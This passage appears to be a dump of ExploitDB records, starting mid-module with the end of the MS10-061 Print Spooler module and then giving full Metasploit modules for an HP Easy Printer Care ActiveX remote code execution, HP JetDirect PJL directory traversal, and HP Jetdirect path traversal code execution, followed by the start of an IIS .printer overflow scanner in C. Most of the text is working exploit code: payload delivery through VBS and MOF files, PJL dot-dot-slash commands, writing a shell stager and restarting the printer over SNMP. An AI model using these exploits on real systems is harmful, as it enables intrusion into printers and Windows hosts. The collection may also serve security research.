phPrinter\r\n\t\t);\r\n=end\r\n\r\n\t\t#print_status(\'Sending ClosePrinter request...\')\r\n\t\tresponse = dcerpc.call(29, handle)\r\n\t\tif (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)\r\n\t\t\t#print_status("\\n" + Rex::Text.to_hex_dump(dcerpc.last_response.stub_data))\r\n\t\t\thandle = dcerpc.last_response.stub_data[0,20]\r\n\t\t\tstatus = dcerpc.last_response.stub_data[20,4].unpack(\'V\').first\r\n\t\t\treturn [status,handle]\r\n\t\tend\r\n\r\n\t\tnil\r\n\tend\r\n\r\n\r\n\tdef seconds_since_midnight(time)\r\n\t\t# .tv_sec always uses .utc\r\n\t\t(time.tv_sec % 86400)\r\n\r\n\t\t# This method uses the localtime\r\n\t\t#(time.hour * 3600) + (time.min * 60) + (time.sec)\r\n\tend\r\n\r\n\t# We have to wait a bit longer since the WMI service is a bit slow..\r\n\tdef wfs_delay\r\n\t\t10\r\n\tend\r\n\r\nend', u'description': u'Microsoft Windows - Print Spooler Service Impersonation (MS10-061) (Metasploit)', u'platform': u'windows', u'author': u'Metasploit', u'cve': [], u'source': u'ExploitDB', u'date': u'2011-02-17T00:00:00+00:00', u'_id': 16361, u'type': u'remote', u'port': 0}

CVE: []
Description: HP Easy Printer Care - XMLCacheMgr Class ActiveX Control Remote Code Execution (Metasploit)
{u'code': u'##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# Framework web site for more information on licensing and terms of use.\r\n# http://metasploit.com/framework/\r\n##\r\n\r\nrequire \'msf/core\'\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n\tRank = GreatRanking\r\n\r\n\tinclude Msf::Exploit::Remote::HttpServer::HTML\r\n\tinclude Msf::Exploit::EXE\r\n\tinclude Msf::Exploit::WbemExec\r\n\r\n\tdef initialize(info = {})\r\n\t\tsuper(update_info(info,\r\n\t\t\t\'Name\'           => \'HP Easy Printer Care XMLCacheMgr Class ActiveX Control Remote Code Execution\',\r\n\t\t\t\'Description\'    => %q{\r\n\t\t\t\t\tThis module allows remote attackers to place arbitrary files on a users file\r\n\t\t\t\tsystem by abusing the "CacheDocumentXMLWithId" method from the "XMLCacheMgr"\r\n\t\t\t\tclass in the HP Easy Printer HPTicketMgr.dll ActiveX Control (HPTicketMgr.dll\r\n\t\t\t\t2.7.2.0).\r\n\r\n\t\t\t\t\tCode execution can be achieved by first uploading the payload to the remote\r\n\t\t\t\tmachine embeddeding a vbs file, and then upload another mof file, which enables\r\n\t\t\t\tWindows Management Instrumentation service to execute the vbs. Please note that\r\n\t\t\t\tthis module currently only works for Windows before Vista.\r\n\t\t\t},\r\n\t\t\t\'License\'        => MSF_LICENSE,\r\n\t\t\t\'Author\'         =>\r\n\t\t\t\t[\r\n\t\t\t\t\t\'Andrea Micalizzi\',  # aka rgod original discovery\r\n\t\t\t\t\t\'juan vazquez\',      # Metasploit module\r\n\t\t\t\t],\r\n\t\t\t\'References\'     =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[ \'CVE\', \'2011-4786\'],\r\n\t\t\t\t\t[ \'BID\', \'51396\'],\r\n\t\t\t\t\t[ \'URL\', \'http://www.zerodayinitiative.com/advisories/ZDI-12-013/\' ],\r\n\t\t\t\t],\r\n\t\t\t\'DefaultOptions\' =>\r\n\t\t\t\t{\r\n\t\t\t\t\t\'InitialAutoRunScript\' => \'migrate -f\',\r\n\t\t\t\t},\r\n\t\t\t\'Payload\'        =>\r\n\t\t\t\t{\r\n\t\t\t\t\t\'Space\'           => 2048,\r\n\t\t\t\t\t\'StackAdjustment\' => -3500,\r\n\t\t\t\t},\r\n\t\t\t\'Platform\'       => \'win\',\r\n\t\t\t\'Targets\'        =>\r\n\t\t\t\t[\r\n\t\t\t\t\t#Windows before Vista\r\n\t\t\t\t\t[ \'Automatic\', { } ],\r\n\t\t\t\t],\r\n\t\t\t\'DefaultTarget\'  => 0,\r\n\t\t\t\'DisclosureDate\' => \'Jan 11 2012\'))\r\n\tend\r\n\r\n\t#\r\n\t# The following handles deleting the copied vbs payload and mof file\r\n\t# See "struts_code_exec.rb" and "ms10_026_dbldecode.rb" for more information.\r\n\t#\r\n\tdef on_new_session(client)\r\n\r\n\t\tif client.type != "meterpreter"\r\n\t\t\tprint_error("NOTE: you must use a meterpreter payload in order to automatically cleanup.")\r\n\t\t\tprint_error("The vbs payload and mof file must be removed manually.")\r\n\t\t\treturn\r\n\t\tend\r\n\r\n\t\treturn if not @var_mof_name\r\n\t\treturn if not @var_vbs_name\r\n\r\n\t\t# stdapi must be loaded before we can use fs.file\r\n\t\tclient.core.use("stdapi") if not client.ext.aliases.include?("stdapi")\r\n\r\n\t\tcmd = "C:\\\\windows\\\\system32\\\\attrib.exe -r " +\r\n\t\t      "C:\\\\windows\\\\system32\\\\wbem\\\\mof\\\\good\\\\" + @var_mof_name + ".mof"\r\n\r\n\t\tclient.sys.process.execute(cmd, nil, {\'Hidden\' => true })\r\n\r\n\t\tbegin\r\n\t\t\tprint_status("Deleting the vbs payload \\"#{@var_vbs_name}.vbs\\" ...")\r\n\t\t\tclient.fs.file.rm("C:\\\\windows\\\\system32\\\\" + @var_vbs_name + ".vbs")\r\n\t\t\tprint_status("Deleting the mof file \\"#{@var_mof_name}.mof\\" ...")\r\n\t\t\tclient.fs.file.rm("C:\\\\windows\\\\system32\\\\wbem\\\\mof\\\\good\\\\" + @var_mof_name + ".mof")\r\n\t\trescue ::Exception => e\r\n\t\t\tprint_error("Exception: #{e.inspect}")\r\n\t\tend\r\n\r\n\tend\r\n\r\n\tdef on_request_uri(cli, request)\r\n\r\n\t\tunless request[\'User-Agent\'] =~ /MSIE/\r\n\t\t\tsend_not_found(cli)\r\n\t\t\tprint_error("#{cli.peerhost}:#{cli.peerport} Unknown user-agent")\r\n\t\t\treturn\r\n\t\tend\r\n\r\n\t\t# Using Windows Management Instrumentation service to execute the payload.\r\n\t\t# Using code from "blackice_downloadimagefileurl.rb". See it for more information.\r\n\r\n\t\tvar_xmlcachemgr = rand_text_alpha(rand(5)+5)\r\n\t\tvar_mof_function_name = rand_text_alpha(rand(5)+5)\r\n\r\n\t\tcontent = <<-EOS\r\n\t\t<html>\r\n\t\t<head>\r\n\t\t<script>\r\n\t\t\tvar #{var_xmlcachemgr} = new ActiveXObject(\'HPESPRIT.XMLCacheMgr.1\');\r\n\r\n\t\t\tfunction #{var_mof_function_name}() {\r\n\t\t\t\t#{var_xmlcachemgr}.CacheDocumentXMLWithId(\r\n\t\t\t\t\t"c:\\\\\\\\WINDOWS\\\\\\\\system32\\\\\\\\wbem\\\\\\\\mof\\\\\\\\#{@var_mof_name}.mof",\r\n\t\t\t\t\tunescape("#{@mof_content}"),\r\n\t\t\t\t\t1,\r\n\t\t\t\t\t1\r\n\t\t\t\t);\r\n\t\t\t}\r\n\r\n\t\t\t#{var_xmlcachemgr}.CacheDocumentXMLWithId(\r\n\t\t\t\t"C:\\\\\\\\WINDOWS\\\\\\\\system32\\\\\\\\#{@var_vbs_name}.vbs",\r\n\t\t\t\tunescape("#{@vbs_content}"),\r\n\t\t\t\t1,\r\n\t\t\t\t1\r\n\t\t\t);\r\n\r\n\t\t\tsetTimeout("#{var_mof_function_name}()", 4000);\r\n\t\t</script>\r\n\t\t</head>\r\n\t\t</html>\r\n\t\tEOS\r\n\r\n\t\tprint_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")\r\n\t\tsend_response_html(cli, content)\r\n\t\thandler(cli)\r\n\tend\r\n\r\n\tdef exploit\r\n\t\t# In order to save binary data to the file system the payload is written to a .vbs\r\n\t\t# file and execute it from there.\r\n\t\t@var_mof_name = rand_text_alpha(rand(5)+5)\r\n\t\t@var_vbs_name = rand_text_alpha(rand(5)+5)\r\n\r\n\t\tprint_status("Encoding payload into vbs...")\r\n\t\tpayload = generate_payload_exe\r\n\t\t@vbs_content = Rex::Text.to_hex(Msf::Util::EXE.to_exe_vbs(payload))\r\n\r\n\t\tprint_status("Generating mof file...")\r\n\t\t@mof_content = Rex::Text.to_hex(generate_mof("#{@var_mof_name}.mof", "#{@var_vbs_name}.vbs"))\r\n\t\tsuper\r\n\tend\r\n\r\nend', u'description': u'HP Easy Printer Care - XMLCacheMgr Class ActiveX Control Remote Code Execution (Metasploit)', u'platform': u'windows', u'author': u'Metasploit', u'cve': [], u'source': u'ExploitDB', u'date': u'2012-01-18T00:00:00+00:00', u'_id': 18381, u'type': u'remote', u'port': 0}

CVE: []
Description: HP JetDirect PJL - Interface Universal Directory Traversal (Metasploit)
{u'code': u'# Exploit Title: HP JetDirect PJL Interface Universal Path Traversal\r\n# Date: Aug 7, 2011\r\n# Author: Myo Soe <YGN Ethical Hacker Group - http://yehg.net/>\r\n# Software Link: http://www.hp.com\r\n# Version: All\r\n# Tested on: HP LaserJet Pxxxx Series\r\n\r\n##\r\n# $Id: $\r\n##\r\n\r\n##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# Framework web site for more information on licensing and terms of use.\r\n# http://metasploit.com/framework/\r\n##\r\n\r\n\r\n##\r\n# Sample Output:\r\n# \r\n#\r\n# msf auxiliary(hp_printer_pjl_traversal) > show options\r\n# \r\n# Module options (auxiliary/admin/hp_printer_pjl_traversal):\r\n# \r\n#    Name         Current Setting  Required  Description\r\n#    ----         ---------------  --------  -----------\r\n#    INTERACTIVE  false            no        Enter interactive mode [msfconsole Only]\r\n#    RHOST        202.138.16.21    yes       The target address\r\n#    RPATH        /                yes       The remote filesystem path to browse or read\r\n#    RPORT        9100             yes       The target port\r\n# \r\n# \r\n# msf auxiliary(hp_printer_pjl_traversal) > run\r\n# \r\n# [*] cd / ...\r\n# [+] Server returned the following response:\r\n# \r\n# . TYPE=DIR\r\n# .. TYPE=DIR\r\n# bin TYPE=DIR\r\n# usr TYPE=DIR\r\n# etc TYPE=DIR\r\n# hpmnt TYPE=DIR\r\n# hp TYPE=DIR\r\n# lib TYPE=DIR\r\n# dev TYPE=DIR\r\n# init TYPE=FILE SIZE=9016\r\n# .profile TYPE=FILE SIZE=834\r\n# tmp TYPE=DIR\r\n# \r\n# \r\n# msf auxiliary(hp_printer_pjl_traversal) > set INTERACTIVE true\r\n# INTERACTIVE => true\r\n# msf auxiliary(hp_printer_pjl_traversal) > set RPATH /hp\r\n# RPATH => /hp\r\n# msf auxiliary(hp_printer_pjl_traversal) > run\r\n# \r\n# [*] Entering interactive mode ...\r\n# [*] cd /hp ...\r\n# [+] Server returned the following response:\r\n# \r\n# . TYPE=DIR\r\n# .. TYPE=DIR\r\n# app TYPE=DIR\r\n# lib TYPE=DIR\r\n# bin TYPE=DIR\r\n# webServer TYPE=DIR\r\n# images TYPE=DIR\r\n# DemoPage TYPE=DIR\r\n# loc TYPE=DIR\r\n# AsianFonts TYPE=DIR\r\n# data TYPE=DIR\r\n# etc TYPE=DIR\r\n# lrt TYPE=DIR\r\n# \r\n# [*] Current RPATH: /hp\r\n# [*] -> \'quit\' to exit\r\n# [*] ->\'/\' to return to file system root\r\n# [*] ->\'..\' to move up to one directory\r\n# [*] ->\'!r FILE\' to read FILE on current directory\r\n# \r\n# [*] Enter RPATH:\r\n# $ > webServer/config\r\n# [*] cd /hp/webServer/config ...\r\n# [+] Server returned the following response:\r\n# \r\n# . TYPE=DIR\r\n# .. TYPE=DIR\r\n# soe.xml TYPE=FILE SIZE=23615\r\n# version.6 TYPE=FILE SIZE=45\r\n# \r\n# \r\n# [*] Current RPATH: /hp/webServer/config\r\n# [*] -> \'quit\' to exit\r\n# [*] ->\'/\' to return to file system root\r\n# [*] ->\'..\' to move up to one directory\r\n# [*] ->\'!r FILE\' to read FILE on current directory\r\n# \r\n# [*] Enter RPATH:\r\n# $ > !r version.6\r\n# [*] cat /hp/webServer/config/version.6 ...\r\n# [+] Server returned the following response:\r\n# \r\n# WebServer directory version.  Do not delete!\r\n# \r\n# \r\n# [*] Current RPATH: /hp/webServer/config\r\n# [*] -> \'quit\' to exit\r\n# [*] ->\'/\' to return to file system root\r\n# [*] ->\'..\' to move up to one directory\r\n# [*] ->\'!r FILE\' to read FILE on current directory\r\n# \r\n# [*] Enter RPATH:\r\n# $ > quit\r\n# [*] Exited ... Have fun with your Printer!\r\n# [*] Auxiliary module execution completed\r\n\r\n\r\n\r\nrequire \'msf/core\'\r\n\r\nclass Metasploit3 < Msf::Auxiliary\r\n\r\n\tinclude Msf::Exploit::Remote::Tcp\r\n\r\n\tdef initialize(info={})\r\n\t\tsuper(update_info(info,\r\n\t\t\t\'Name\'        => \'HP JetDirect PJL Interface Universal Path Traversal\',\r\n\t\t\t\'Version\'     => \'$Revision: 1 $\',\r\n\t\t\t\'Description\'\t=> %q{\r\n\t\t\t\tThis module exploits path traveresal issue in possibly all HP network-enabled printer series, especially those which enable Printer Job Language (aka PJL) command interface through the default JetDirect port 9100. \r\n\t\t\t\tWith the decade-old dot-dot-slash payloads, the entire printer file system can be accessed or modified.\r\n\t\t\t},\r\n\t\t\t\'Author\'      => [\r\n\t\t\t\t\t\'Moritz Jodeit <http://www.nruns.com/>\', # Bug Discoverer\r\n\t\t\t\t\t\'Myo Soe <YGN Ethical Hacker Group, http://yehg.net/>\' # Metasploit Module\t\t\t\t\t\r\n\t\t\t\t\t],\r\n\t\t\t\'License\'     => MSF_LICENSE,\r\n\t\t\t\'References\'     =>\r\n\t\t\t[\r\n\t\t\t\t[ \'CVE\', \'2010-4107\' ],\r\n\t\t\t\t[ \'URL\', \'http://www.nruns.com/_downloads/SA-2010%20003-Hewlett-Packard.pdf\' ],\t\t\t\t\r\n\t\t\t\t[ \'URL\', \'http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02004333\' ],\t\t\t\t\r\n\t\t\t\t[ \'URL\', \'http://www.irongeek.com/i.php?page=security/networkprinterhacking\' ],\r\n\t\t\t\t[ \'URL\', \'https://github.com/urbanadventurer/WhatWeb/blob/master/plugins/HP-laserjet-printer.rb\' ],\r\n\t\t\t\t[ \'URL\', \'https://github.com/urbanadventurer/WhatWeb/blob/master/plugins/HP-OfficeJet-Printer.rb\' ],\r\n\t\t\t\t[ \'URL\', \'http://core.yehg.net/lab/#tools.exploits\' ]\r\n\t\t\t],\r\n\t\t\t\'DisclosureDate\' => \'2010-11-15\'))\r\n\t\t\r\n\t\tregister_options(\r\n\t\t[\r\n\r\n\t\t\tOptString.new(\'RPATH\',\r\n\t\t\t\t\t[\r\n\t\t\t\t\t\ttrue,\r\n\t\t\t\t\t\t"The remote filesystem path to browse or read",\r\n\t\t\t\t\t\t"/"\r\n\t\t\t\t\t]\r\n\t\t\t\t),\r\n\t\t\tOptBool.new(\'INTERACTIVE\',\r\n\t\t\t\t\t\t\t\t[\r\n\t\t\t\t\t\t\t\t\tfalse,\r\n\t\t\t\t\t\t\t\t\t"Enter interactive mode [msfconsole Only]",\r\n\t\t\t\t\t\t\t\t\tfalse\r\n\t\t\t\t\t\t\t\t]\r\n\t\t\t\t\t\t\t),\r\n\t\t\t\t\r\n\t\t\tOpt::RPORT(9100)\r\n\t\t],self.class)\r\n\t\t\r\n\r\n\tend\r\n\r\n\tdef run\r\n\t\tmode = datastore[\'INTERACTIVE\']\r\n\r\n\t\tif mode\t== true\r\n\t\t\tset_interactive(datastore[\'RPATH\'])\r\n\t\telse\r\n\t\t\tset_onetime(datastore[\'RPATH\'])\r\n\t\tend\r\n\tend\r\n\t\r\n\tdef set_interactive(spath)\r\n\t\taction = \'DIR\'\r\n\t\trpath =  spath\r\n\t\trfpath = \'\'\r\n\t\ttmp_path = \'\'\r\n\t\ttmp_file = \'\'\r\n\t\tcur_dir = \'/\'\r\n\t\t\r\n\t\tprint_status("Entering interactive mode")\r\n\t\tstop = false\r\n\t\t\r\n\t\tset_onetime(rpath)\r\n\t\t\r\n\t\tuntil stop == true\t\t\r\n\t\t\tprint_status("Current RPATH: #{rpath}")\r\n\t\t\tprint_status("-> \'quit\' to exit")\r\n\t\t\tprint_status("->\'/\' to return to file system root")\r\n\t\t\tprint_status("->\'..\' to move up to one directory")\r\n\t\t\tprint_status("->\'!r FILE\' to read FILE on current directory\\r\\n")\r\n\t\t\tprint_status("Enter RPATH:")\r\n\t\t\tprint("$ > ")\r\n\r\n\t\t\ttmp_path = gets.chomp.to_s\t\r\n\t\t\t\r\n\r\n\t\t\tif tmp_path =~ /\\.\\./ && rpath.length > 2\r\n\t\t\t\told_path = rpath\r\n\t\t\t\tnew_path = rpath[0,rpath.rindex(\'/\')]\r\n\t\t\t\tif new_path != nil\r\n\t\t\t\t\trpath = new_path\r\n\t\t\t\telse\r\n\t\t\t\t\trpath = \'/\'\r\n\t\t\t\tend\r\n\t\t\t\trpath = \'/\' if rpath.length == 0\r\n\t\t\t\tprint_status("Change to one up directory: #{rpath}")\r\n\t\t\telsif tmp_path =~ /\\!r\\s/\t\r\n\t\t\t\tcur_dir = rpath\r\n\t\t\t\ttmp_file = tmp_path.gsub(\'!r \',\'\')\r\n\t\t\t\trfpath = cur_dir + \'/\' + tmp_file\r\n\t\t\t\trfpath = rfpath.gsub(\'//\',\'/\')\t\r\n\t\t\t\taction = \'FILE\'\r\n\t\t\t\t\r\n\t\t\telsif tmp_path == \'/\'\r\n\t\t\t\trpath = \'/\'\r\n\t\t\telsif rpath != \'/\' \r\n\t\t\t   \trpath = rpath + \'/\' << tmp_path\r\n\t\t\telse\r\n\t\t\t\trpath = rpath  << tmp_path\r\n\t\t\tend\r\n\t\t\tif rpath =~ /quit/\r\n\t\t\t\tstop= true\r\n\t\t\t\trpath = \'/\'\r\n\t\t\t\tprint_status("Exited ... Have fun with your Printer!")\r\n\t\t\telse\r\n\t\t\t\trpath = rpath.gsub(\'//\',\'/\')\t\r\n\t\t\t\tif action == \'FILE\'\r\n\t\t\t\t\tset_onetime(rfpath,action)\r\n\t\t\t\t\tcur_dir = rpath\r\n\t\t\t\telse\r\n\t\t\t\t\tset_onetime(rpath,action)\r\n\t\t\t\tend\r\n\t\t\t\taction = \'DIR\'\t\r\n\t\t\tend\r\n\t\tend\r\n\tend \r\n\t\r\n\tdef set_onetime(spath,saction =  datastore[\'ACTION\'])\r\n\t\t\r\n\t\trpathx  = spath\r\n\t\taction = saction\r\n\t\trpathx = \'/\' if rpathx =~ /\\/quit/\r\n\r\n\t\tconnect\r\n\t\t\r\n\t\tdir_cmd = "\\x1b%-12345X@PJL FSDIRLIST NAME=\\"0:/../../../[REPLACE]\\" ENTRY=1 COUNT=99999999\\x0d\\x0a\\x1b%-12345X\\x0d\\x0a"\r\n\t\tfile_cmd = "\\x1b%-12345X@PJL FSUPLOAD NAME=\\"0:/../../../[REPLACE]\\" OFFSET=0 SIZE=99999999\\x0d\\x0a\\x1b%-12345X\\x0d\\x0a"\r\n\t\t\r\n\t\tif action =~ /DIR/ \r\n\t\t\tr_cmd = dir_cmd.sub("[REPLACE]",rpathx)\r\n\t\t\tprint_status("cd #{rpathx} ...")\r\n\t\telse \r\n\t\t\tr_cmd = file_cmd.sub("[REPLACE]",rpathx)\r\n\t\t\tprint_status("cat #{rpathx} ...")\t\r\n\t\tend \r\n\t\t\r\n \t\t\r\n\t\t\r\n\t\trecv = sock.put(r_cmd)\r\n\t\tres = sock.get(-1,1)\r\n\t\t\r\n\t\tif (!res)\r\n\t\t\tprint_error("ERROR in receiving data!\\r\\n")\r\n\t\telse\r\n\t\t\tif res.to_s =~ /ERROR/ \r\n\t\t\t\tprint_error("Operation Not Permitted or File/DIR Not Found!\\r\\n")\r\n\t\t\t\tdisconnect\r\n\t\t\t\treturn\r\n\t\t\tend\r\n\t\t\tresx = res.to_s[res.index("\\r\\n")+1,res.length]\r\n\t\t\tprint_good("Server returned the following response:\\r\\n#{resx}")\r\n\t\tend\r\n\t\t\r\n\t\tdisconnect\t\r\n\t\r\n\tend\r\n\r\n\r\nend', u'description': u'HP JetDirect PJL - Interface Universal Directory Traversal (Metasploit)', u'platform': u'hardware', u'author': u'Myo Soe', u'cve': [], u'source': u'ExploitDB', u'date': u'2011-08-07T00:00:00+00:00', u'_id': 17635, u'type': u'remote', u'port': 0}

CVE: []
Description: HP Jetdirect - Path Traversal Arbitrary Code Execution (Metasploit)
{u'code': u'##\r\n# This module requires Metasploit: https://metasploit.com/download\r\n# Current source: https://github.com/rapid7/metasploit-framework\r\n##\r\n\r\nrequire "rex/proto/pjl"\r\n\r\nclass MetasploitModule < Msf::Exploit::Remote\r\n\r\n  Rank = NormalRanking\r\n\r\n  include Msf::Exploit::Remote::SNMPClient\r\n  include Msf::Exploit::Remote::Tcp\r\n  include Msf::Exploit::CmdStager\r\n\r\n  def initialize(info = {})\r\n    super(update_info(info,\r\n      \'Name\'           => \'HP Jetdirect Path Traversal Arbitrary Code Execution\',\r\n      \'Description\'    => %q{\r\n        The module exploits a path traversal via Jetdirect to gain arbitrary code execution by\r\n        writing a shell script that is loaded on startup to /etc/profile.d. Then, the printer\r\n        is restarted using SNMP. Impacted printers:\r\n        HP PageWide Managed MFP P57750dw\r\n        HP PageWide Managed P55250dw\r\n        HP PageWide Pro MFP 577z\r\n        HP PageWide Pro 552dw\r\n        HP PageWide Pro MFP 577dw\r\n        HP PageWide Pro MFP 477dw\r\n        HP PageWide Pro 452dw\r\n        HP PageWide Pro MFP 477dn\r\n        HP PageWide Pro 452dn\r\n        HP PageWide MFP 377dw\r\n        HP PageWide 352dw\r\n        HP OfficeJet Pro 8730 All-in-One Printer\r\n        HP OfficeJet Pro 8740 All-in-One Printer\r\n        HP OfficeJet Pro 8210 Printer\r\n        HP OfficeJet Pro 8216 Printer\r\n        HP OfficeJet Pro 8218 Printer\r\n\r\n        Please read the module documentation regarding the possibility for leaving an\r\n        unauthenticated telnetd service running as a side effect of this exploit.\r\n      },\r\n      \'Author\'         => [\r\n        \'Jacob Baines\', # Python PoC\r\n        \'Matthew Kienow <matthew_kienow[AT]rapid7.com>\', # Metasploit module\r\n       ],\r\n      \'License\'        => MSF_LICENSE,\r\n      \'References\'     =>\r\n        [\r\n          [ \'CVE\', \'2017-2741\' ],\r\n          [ \'URL\', \'https://support.hp.com/lt-en/document/c05462914\' ],\r\n          [ \'URL\', \'http://tenable.com/blog/rooting-a-printer-from-security-bulletin-to-remote-code-execution\' ]\r\n        ],\r\n      \'Targets\'        => [\r\n        [\'Unix (In-Memory)\',\r\n          \'Platform\'   => \'unix\',\r\n          \'Arch\'       => ARCH_CMD,\r\n          \'Payload\'    => {\r\n            \'Compat\' => {\r\n              \'PayloadType\' => \'cmd\'\r\n            }\r\n          },\r\n        ]\r\n      ],\r\n      \'Privileged\'     => true,\r\n      \'DisclosureDate\' => \'Apr 05 2017\',\r\n      \'DefaultTarget\'  => 0,\r\n      \'DefaultOptions\' => {\r\n        \'PAYLOAD\'  => \'cmd/unix/bind_busybox_telnetd\',\r\n        \'WfsDelay\' => 180\r\n      }\r\n    ))\r\n\r\n    register_options(\r\n      [\r\n        Opt::RPORT(Rex::Proto::PJL::DEFAULT_PORT),\r\n        OptPort.new(\'SNMPPORT\', [true, \'The SNMP port\', 161])\r\n      ]\r\n    )\r\n  end\r\n\r\n  def execute_command(cmd, opts = {})\r\n    rpath = \'0:/../../rw/var/etc/profile.d/\'\r\n    stager_script_name = opts[:stager_script_name]\r\n    cmd = "(cd / && #{cmd}); rm -f /etc/profile.d/#{stager_script_name}"\r\n\r\n    begin\r\n      # use PJL to write command stager\r\n      print_status("Connecting to port #{rport}...")\r\n\r\n      pjl = Rex::Proto::PJL::Client.new(sock)\r\n      pjl.begin_job\r\n\r\n      pjl.fsinit(rpath[0..1])\r\n\r\n      print_status("Attempting to write command stager...")\r\n      rpath = "#{rpath}#{stager_script_name}"\r\n      if pjl.fsdownload(cmd, rpath, is_file: false)\r\n        print_good("Successfully wrote command stager to #{rpath}")\r\n      else\r\n        print_error("Failed to write command stager to #{rpath}")\r\n        return\r\n      end\r\n\r\n      # verify command stager exists\r\n      unless pjl.fsquery(rpath)\r\n        print_error("Command stager does not exist at #{rpath}; aborting...")\r\n        return\r\n      end\r\n\r\n      pjl.end_job\r\n\r\n    rescue Rex::ConnectionError\r\n      print_error("Connection Refused")\r\n      raise\r\n    end\r\n  end\r\n\r\n  def restart_printer\r\n    pjl_port = datastore[\'RPORT\']\r\n    snmp_port = datastore[\'SNMPPORT\']\r\n    community = datastore[\'COMMUNITY\']\r\n    # Printer MIB prtGeneralReset object identifier (numeric notation)\r\n    prt_general_reset = \'1.3.6.1.2.1.43.5.1.1.3.1\'\r\n    # prtGeneralReset powerCycleReset(4) value\r\n    power_cycle_reset = 4\r\n\r\n    begin\r\n      # TODO: Update when there is a clean approach to using two or more mixins that both use RPORT.\r\n      datastore[\'RPORT\'] = snmp_port\r\n      print_status("Connecting to SNMP port #{rport}...")\r\n      snmp = connect_snmp\r\n\r\n      # get value of Printer MIB prtGeneralReset\r\n      reset_value = snmp.get_value(prt_general_reset)\r\n      reset_value = "\'\'" if reset_value.is_a?(SNMP::Null)\r\n      print_status("Initial value of prtGeneralReset OID #{prt_general_reset} => #{reset_value}")\r\n\r\n      # set value of Printer MIB prtGeneralReset to powerCycleReset(4)\r\n      print_status("Attempting to restart printer via SNMP...")\r\n      varbind = SNMP::VarBind.new(prt_general_reset, SNMP::Integer.new(power_cycle_reset))\r\n      response = snmp.set(varbind)\r\n\r\n      if response.error_status == :noError\r\n        print_status("Set prtGeneralReset OID #{prt_general_reset} => #{power_cycle_reset}")\r\n\r\n        # get value of Printer MIB prtGeneralReset\r\n        reset_value = snmp.get_value(prt_general_reset)\r\n        reset_value = "\'\'" if reset_value.is_a?(SNMP::Null)\r\n        print_status("Current value of prtGeneralReset OID #{prt_general_reset} => #{reset_value}")\r\n        print_status("Printer restarting...")\r\n\r\n      else\r\n        print_error("Unable to set prtGeneralReset; SNMP response error status: #{response.error_status}")\r\n      end\r\n\r\n    rescue SNMP::RequestTimeout\r\n      print_error("SNMP request timeout with community \'#{community}\'")\r\n      raise\r\n    rescue SNMP::UnsupportedVersion\r\n      print_error("Unsupported SNMP version specified; use \'1\' or \'2c\'")\r\n      raise\r\n    rescue Rex::ConnectionError\r\n      print_error("Connection Refused")\r\n      raise\r\n    ensure\r\n      # restore original rport value\r\n      datastore[\'RPORT\'] = pjl_port\r\n    end\r\n  end\r\n\r\n  def exploit\r\n    begin\r\n      opts = {\r\n        stager_script_name: "#{Rex::Text.rand_text_alpha(8)}.sh"\r\n      }\r\n\r\n      print_status("Exploiting...")\r\n      connect\r\n      if target.name =~ /Unix/\r\n        execute_command(payload.encoded, opts)\r\n      else\r\n        execute_cmdstager(opts)\r\n      end\r\n      restart_printer\r\n\r\n      return\r\n    ensure\r\n      disconnect\r\n    end\r\n  end\r\n\r\nend', u'description': u'HP Jetdirect - Path Traversal Arbitrary Code Execution (Metasploit)', u'platform': u'unix', u'author': u'Metasploit', u'cve': [], u'source': u'ExploitDB', u'date': u'2018-08-27T00:00:00+00:00', u'_id': 45273, u'type': u'remote', u'port': 0}

CVE: []
Description: Microsoft IIS 5.0 - '.printer' ISAPI Extension Buffer Overflow (3)
{u'code': u'source: http://www.securityfocus.com/bid/2674/info\r\n  \r\nWindows 2000 Internet printing ISAPI extension contains msw3prt.dll which handles user requests. Due to an unchecked buffer in msw3prt.dll, a maliciously crafted HTTP .printer request containing approx 420 bytes in the \'Host:\' field will allow the execution of arbitrary code. Typically a web server would stop responding in a buffer overflow condition; however, once Windows 2000 detects an unresponsive web server it automatically performs a restart. Therefore, the administrator will be unaware of this attack.\r\n  \r\n* If Web-based Printing has been configured in group policy, attempts to disable or unmap the affected extension via Internet Services Manager will be overridden by the group policy settings. \r\n\r\n/*\r\n   Author:  styx^\r\n\r\n   source:  Iis Isapi Vulnerabilities Checker v 1.0\r\n\r\n   License: GPL\r\n            This program is free software; you can redistribute it and/or\r\n            modify it under the terms of the GNU General Public License\r\n            as published by the Free Software Foundation; either version 2\r\n            of the License, or (at your option) any later version.\r\n\r\n   Email:   Write me for any problem or suggestion at: the.styx@gmail.com\r\n\r\n   Date:    02/02/2005\r\n\r\n   Read me: Just compile it with:\r\n\r\n            Compile: gcc iivc.c -o iivc\r\n            Use: ./iivc <initial_ip> <final_ip> [facultative(log_file)]\r\n            Example: ./iivc 127.0.0.1 127.0.0.4 scan.log\r\n\r\n\r\n            PAY ATTENTION: This source is coded for only personal use on\r\n            your own iis servers. Don\'t hack around.\r\n\r\n            Special thanks very much:\r\n            To overIP (he\'s my master :)\r\n            To hacklab crew (www.hacklab.tk)\r\n\r\n   Bug:     This checker scans a range of ip and checks the iis 5.0/1\r\n            sp1/2 .printer ISAPI extension buffer overflow\r\n            vulnerability. If we send to a server about\r\n            420 bytes,we can do a buffer overflow.Find for more\r\n            specifications of this vulnerability in\r\n            www.securityfocus.com or bugtraq. Enjoy your self! :)\r\n\r\n            (I\'ve been ispired (but just this :) from perl storm@stormdev.net\'s\r\n            checker).\r\n\r\n*/\r\n\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <sys/types.h>\r\n#include <sys/ioctl.h>\r\n#include <fcntl.h>\r\n#include <sys/socket.h>\r\n#include <netinet/in.h>\r\n#include <unistd.h>\r\n#include <string.h>\r\n#include <signal.h>\r\n#include <time.h>\r\n\r\n#define PORTA 80\r\n\r\n\r\nint i = 0, j = 0, k = 0, l = 0;\r\nint a = 0, b = 0, c = 0, d = 0;\r\nint z = 0;\r\nFILE *f;\r\n\r\n\r\nint result(int );\r\nvoid scan(char *);\r\nvoid separe(char *, char *);\r\nvoid write_file(char *);\r\nvoid author();\r\n\r\n\r\nint main(int argn, char *argv[]) {\r\n\r\n        char initip[16], 